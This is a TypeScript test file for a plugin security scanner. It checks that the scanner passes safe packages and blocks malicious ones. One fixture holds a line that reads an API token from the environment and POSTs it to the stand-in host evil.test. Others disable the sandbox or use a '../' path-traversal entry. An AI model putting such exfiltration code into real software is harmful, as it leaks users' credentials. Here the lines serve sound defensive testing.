import { gzipSync } from 'node:zlib'
import { describe, expect, it } from 'vitest'
import { pack } from 'tar-stream'
import { dshRulePack, scanArtifact } from '../packages/security-scanner/src'
import type { RulePack } from '../packages/security-scanner/src'

async function archive(entries: Record<string, string>): Promise<Buffer> {
  const stream = pack()
  const chunks: Buffer[] = []
  for (const [name, content] of Object.entries(entries)) {
    stream.entry({ name, type: 'file' }, Buffer.from(content))
  }
  stream.finalize()
  for await (const chunk of stream) chunks.push(Buffer.from(chunk))
  return gzipSync(Buffer.concat(chunks))
}

describe('independent security scanner', () => {
  it('passes a complete package without risky capabilities', async () => {
    const bytes = await archive({
      'package/package.json': JSON.stringify({
        name: 'safe-plugin',
        version: '1.0.0',
        dependencies: { exact: '2.0.0', ranged: '^3.0.0' }
      }),
      'package/index.js': 'export const answer = 42\n'
    })

    const report = await scanArtifact({ bytes }, { rulePacks: [dshRulePack] })

    expect(report.recommendation).toBe('pass')
    expect(report.coverage.complete).toBe(true)
    expect(report.coverage.scannedFiles).toBe(2)
    expect(report.dependencies).toEqual([
      { name: 'exact', spec: '2.0.0', scope: 'production', exactVersion: '2.0.0' },
      { name: 'ranged', spec: '^3.0.0', scope: 'production', exactVersion: undefined }
    ])
    expect(report.supplyChain.osv.status).toBe('not-run')
  })

  it('blocks a sensitive-data and network attack chain', async () => {
    const bytes = await archive({
      'package/package.json': JSON.stringify({ name: 'bad-plugin', version: '1.0.0' }),
      'package/index.js': 'const token = process.env.API_TOKEN; fetch("https://evil.test", { method: "POST", body: token })'
    })

    const report = await scanArtifact({ bytes }, { rulePacks: [dshRulePack] })

    expect(report.recommendation).toBe('block')
    expect(report.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({ ruleId: 'chain.sensitive-network', severity: 'critical' })
    ]))
  })

  it('blocks DSH patches that disable security controls', async () => {
    const bytes = await archive({
      'repository/plugin/package.json': JSON.stringify({ name: 'patch-plugin', version: '1.0.0' }),
      'repository/plugin/cordis.patch.yml': 'sandbox: false\n'
    })

    const report = await scanArtifact(
      { bytes, identity: { packagePath: 'plugin' } },
      { rulePacks: [dshRulePack] }
    )

    expect(report.recommendation).toBe('block')
    expect(report.findings.some((finding) => finding.ruleId === 'dsh.patch.security-disable')).toBe(true)
  })

  it('returns incomplete when a file exceeds the configured coverage limit', async () => {
    const bytes = await archive({
      'package/package.json': JSON.stringify({ name: 'large-plugin', version: '1.0.0' }),
      'package/index.js': 'x'.repeat(256)
    })

    const report = await scanArtifact(
      { bytes },
      { limits: { maxFileBytes: 64 }, rulePacks: [dshRulePack] }
    )

    expect(report.recommendation).toBe('incomplete')
    expect(report.coverage.complete).toBe(false)
    expect(report.coverage.skippedFiles).toBe(1)
  })

  it('detects archive path traversal without extracting files', async () => {
    const bytes = await archive({
      'package/package.json': JSON.stringify({ name: 'escape-plugin', version: '1.0.0' }),
      '../escape.js': 'malicious()'
    })

    const report = await scanArtifact({ bytes }, { rulePacks: [dshRulePack] })

    expect(report.recommendation).toBe('block')
    expect(report.findings.some((finding) => finding.ruleId === 'archive.path-traversal')).toBe(true)
  })

  it('marks the report incomplete when findings exceed the IPC report limit', async () => {
    const bytes = await archive({
      'package/package.json': JSON.stringify({ name: 'noisy-plugin', version: '1.0.0' })
    })
    const noisyRules: RulePack = {
      id: 'test/noisy-rules',
      version: '1.0.0',
      scan(context) {
        for (let index = 0; index < 510; index += 1) {
          context.addFinding({
            ruleId: `test.finding.${index}`,
            severity: 'info',
            category: 'code-quality',
            title: '测试发现',
            description: '用于验证报告上限。',
            file: `file-${index}.js`,
            engine: 'test'
          })
        }
      }
    }

    const report = await scanArtifact({ bytes }, { rulePacks: [noisyRules] })

    expect(report.recommendation).toBe('incomplete')
    expect(report.findings).toHaveLength(500)
    expect(report.coverage.notes.some((note) => note.includes('报告已截断'))).toBe(true)
  })

  it('keeps a critical finding blocking even when scan coverage is incomplete', async () => {
    const bytes = await archive({
      'package/package.json': JSON.stringify({ name: 'critical-incomplete', version: '1.0.0' }),
      'package/large.js': 'x'.repeat(256)
    })
    const criticalRules: RulePack = {
      id: 'test/critical-rules',
      version: '1.0.0',
      scan(context) {
        context.addFinding({
          ruleId: 'test.critical-danger',
          severity: 'critical',
          category: 'dynamic-execution',
          title: '严重危险代码',
          description: '测试阻断优先级。',
          engine: 'test'
        })
      }
    }

    const report = await scanArtifact(
      { bytes },
      { limits: { maxFileBytes: 64 }, rulePacks: [criticalRules] }
    )

    expect(report.coverage.complete).toBe(false)
    expect(report.recommendation).toBe('block')
  })
})
